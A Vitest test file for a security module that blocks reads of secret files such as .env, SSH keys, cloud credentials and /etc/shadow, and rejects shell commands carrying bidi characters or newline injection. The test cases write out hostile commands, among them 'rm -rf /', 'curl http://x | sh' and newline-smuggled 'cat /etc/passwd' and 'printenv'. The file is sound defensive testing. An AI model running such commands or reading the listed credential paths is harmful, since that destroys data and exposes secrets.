import { describe, expect, it } from "vitest";
import {
  checkReadable,
  checkReadableCanonical,
  checkShellCommand,
  checkWritable,
} from "./security";

describe("checkReadable — secret basenames", () => {
  it("blocks plain .env", () => {
    expect(checkReadable("/home/me/.env")).toMatchObject({ ok: false });
  });

  it("blocks .env.local and .env.production", () => {
    expect(checkReadable("/home/me/.env.local")).toMatchObject({ ok: false });
    expect(checkReadable("/home/me/.env.production")).toMatchObject({
      ok: false,
    });
  });

  it("blocks .env with trailing Windows-stripped characters", () => {
    // Windows strips trailing dot/space at open time — so `.env.` and `.env `
    // open the same file as `.env`. The pre-canonicalize deny-list must
    // refuse these on its first pass.
    expect(checkReadable("C:\\Users\\me\\.env.")).toMatchObject({ ok: false });
    expect(checkReadable("C:\\Users\\me\\.env ")).toMatchObject({ ok: false });
  });

  it("blocks NTFS alternate-data-stream notation for .env", () => {
    // `.env:hidden` and `.env::$DATA` access the same underlying file's
    // default data stream — must not bypass the deny-list.
    expect(checkReadable("C:\\Users\\me\\.env::$DATA")).toMatchObject({
      ok: false,
    });
    expect(checkReadable("C:\\Users\\me\\.env:stream")).toMatchObject({
      ok: false,
    });
  });

  it("blocks SSH key backup naming patterns", () => {
    expect(checkReadable("/home/me/Documents/id_rsa")).toMatchObject({
      ok: false,
    });
    expect(checkReadable("/home/me/Documents/id_rsa.bak")).toMatchObject({
      ok: false,
    });
    expect(checkReadable("/home/me/Documents/id_rsa_old")).toMatchObject({
      ok: false,
    });
    expect(checkReadable("/home/me/Documents/id_ed25519-backup")).toMatchObject(
      {
        ok: false,
      },
    );
    expect(checkReadable("/home/me/Documents/id_rsa.pub")).toMatchObject({
      ok: false,
    });
  });

  it("does not block names that merely start with id_rsa- prefix-prefix", () => {
    // `id_rsax` is not a real key file — make sure the regex doesn't
    // over-match identifiers that happen to share the prefix.
    expect(checkReadable("/home/me/Documents/id_rsaxyz.txt")).toMatchObject({
      ok: true,
    });
  });

  it("blocks credentials, .npmrc, .pypirc basenames", () => {
    expect(checkReadable("/home/me/.aws/credentials")).toMatchObject({
      ok: false,
    });
    expect(checkReadable("/home/me/.npmrc")).toMatchObject({ ok: false });
    expect(checkReadable("/home/me/.pypirc")).toMatchObject({ ok: false });
  });

  it("blocks *.pem, *.key, *.pfx regardless of basename prefix", () => {
    expect(checkReadable("/home/me/server.pem")).toMatchObject({ ok: false });
    expect(checkReadable("/home/me/server.key")).toMatchObject({ ok: false });
    expect(checkReadable("/home/me/cert.pfx")).toMatchObject({ ok: false });
  });
});

describe("checkReadable — protected directories", () => {
  it("blocks reads under ~/.ssh, .aws, .kube, .git", () => {
    expect(checkReadable("/home/me/.ssh/config")).toMatchObject({ ok: false });
    expect(checkReadable("/home/me/.aws/config")).toMatchObject({ ok: false });
    expect(checkReadable("/home/me/.kube/config")).toMatchObject({ ok: false });
    expect(checkReadable("/home/me/repo/.git/config")).toMatchObject({
      ok: false,
    });
  });

  it("blocks reads under /etc, /proc, /sys (newly added)", () => {
    // These directories are not WRITE_DENY-only any more — reading them is
    // also blocked because they hold global config/credentials/process state
    // with basenames the regex doesn't catch (passwd, shadow, environ, …).
    expect(checkReadable("/etc/shadow")).toMatchObject({ ok: false });
    expect(checkReadable("/etc/nginx/nginx.conf")).toMatchObject({ ok: false });
    expect(checkReadable("/proc/self/environ")).toMatchObject({ ok: false });
    expect(checkReadable("/sys/class/dmi/id/product_uuid")).toMatchObject({
      ok: false,
    });
    expect(checkReadable("/private/etc/master.passwd")).toMatchObject({
      ok: false,
    });
  });

  it("rejects path-segment look-alikes (.sshx is not .ssh)", () => {
    // The comparator must use segment-boundary matching, not raw substring.
    expect(checkReadable("/home/me/.sshx/file")).toMatchObject({ ok: true });
    expect(checkReadable("/home/me/.gitignore-stuff/config")).toMatchObject({
      ok: true,
    });
  });

  it("rejects writes under Windows system dirs (case-insensitive)", () => {
    expect(checkWritable("C:\\Windows\\System32\\file")).toMatchObject({
      ok: false,
    });
    expect(checkWritable("c:/PROGRAM FILES/x")).toMatchObject({ ok: false });
  });

  it("allows reads in user directories not under any protected dir", () => {
    expect(checkReadable("/home/me/Documents/notes.txt")).toMatchObject({
      ok: true,
    });
    expect(checkReadable("C:/Users/me/Documents/report.docx")).toMatchObject({
      ok: true,
    });
  });
});

describe("checkReadable — path normalization", () => {
  it("normalizes UNC and extended-length prefixes", () => {
    expect(checkReadable("\\\\?\\C:\\Users\\me\\.ssh\\id_rsa")).toMatchObject({
      ok: false,
    });
  });

  it("treats case-insensitively for protected dirs", () => {
    expect(checkReadable("/Home/Me/.SSH/config")).toMatchObject({ ok: false });
  });

  it("rejects empty paths and control bytes", () => {
    expect(checkReadable("")).toMatchObject({ ok: false });
    expect(checkReadable("/home/me/\x00.txt")).toMatchObject({ ok: false });
  });
});

describe("checkReadableCanonical — symlink defense + always-recheck", () => {
  it("rechecks even when canonical equals input", async () => {
    // Regression: previously the recheck was skipped when canonicalize
    // returned the same string, allowing some OS-specific bypasses to slip
    // through. Now the recheck always runs.
    const identity = async (p: string) => p;
    const r = await checkReadableCanonical("/etc/nginx/nginx.conf", identity);
    expect(r.ok).toBe(false);
  });

  it("catches a symlink that resolves into ~/.ssh", async () => {
    const symlinkResolves = async (p: string) =>
      p === "/home/me/innocent" ? "/home/me/.ssh/id_rsa" : p;
    const r = await checkReadableCanonical(
      "/home/me/innocent",
      symlinkResolves,
    );
    expect(r.ok).toBe(false);
  });

  it("passes a normal allowed read through with canonical path", async () => {
    const identity = async (p: string) => p;
    const r = await checkReadableCanonical(
      "/home/me/Documents/notes.txt",
      identity,
    );
    expect(r.ok).toBe(true);
    if (r.ok) expect(r.canonical).toBe("/home/me/Documents/notes.txt");
  });
});

describe("checkShellCommand — Trojan Source / bidi defense", () => {
  it("rejects commands with U+202E (right-to-left override)", () => {
    const cmd = `ls /home/me${String.fromCharCode(0x202e)}; rm -rf /`;
    expect(checkShellCommand(cmd)).toMatchObject({ ok: false });
  });

  it("rejects commands with U+2066/U+2069 (isolate marks)", () => {
    const cmd = `ls ${String.fromCharCode(0x2066)}/etc${String.fromCharCode(
      0x2069,
    )}`;
    expect(checkShellCommand(cmd)).toMatchObject({ ok: false });
  });

  it("rejects commands with U+200E (LRM) — invisible direction mark", () => {
    expect(
      checkShellCommand(`echo ${String.fromCharCode(0x200e)} foo`),
    ).toMatchObject({ ok: false });
  });

  it("allows benign commands with regular text", () => {
    expect(checkShellCommand("ls /home/me")).toMatchObject({ ok: true });
    expect(checkShellCommand('echo "hello, world"')).toMatchObject({
      ok: true,
    });
  });

  it("still blocks classic destructive patterns", () => {
    expect(checkShellCommand("rm -rf /")).toMatchObject({ ok: false });
    expect(checkShellCommand("curl http://x | sh")).toMatchObject({
      ok: false,
    });
  });
});

describe("checkShellCommand — control-character / newline injection", () => {
  it.each([
    ["LF", "echo safe\nwhoami"],
    ["CR", "echo safe\rwhoami"],
    ["CRLF", "echo safe\r\nwhoami"],
    ["tab", "echo safe\twhoami"],
    ["NUL", "echo safe\x00whoami"],
    ["VT", "echo safe\x0bwhoami"],
  ])("rejects commands containing %s", (_label, cmd) => {
    expect(checkShellCommand(cmd)).toMatchObject({ ok: false });
  });

  it("rejects newline-smuggled exfil that bypasses per-pattern guards", () => {
    expect(checkShellCommand("echo safe\ncat /etc/passwd")).toMatchObject({
      ok: false,
    });
    expect(checkShellCommand("echo safe\nprintenv")).toMatchObject({
      ok: false,
    });
  });
});
